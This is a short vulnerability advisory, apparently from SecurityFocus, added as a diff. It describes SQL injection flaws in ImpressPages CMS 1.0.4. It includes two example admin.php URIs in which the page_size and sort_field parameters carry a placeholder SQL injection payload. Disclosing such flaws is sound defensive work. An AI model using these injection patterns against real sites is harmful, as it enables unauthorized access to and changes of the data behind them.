@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/40431/info
+
+ImpressPages CMS is prone to multiple SQL-injection vulnerabilities because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.
+
+Exploiting these issues could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+ImpressPages CMS 1.0.4 is vulnerable; prior versions may also be affected. 
+
+The following example URIs are available:
+
+http://www.example.com/admin.php?module_id=329&security_token=$valid_token&page[0]=&page_size[0]=200+ANY_SQL_HERE+--++
+
+http://www.example.com/admin.php?module_id=329&security_token=$valid_token&sort_field[1]=&email+ANY_SQL_HERE+--+&sort_dir[1]=asc 
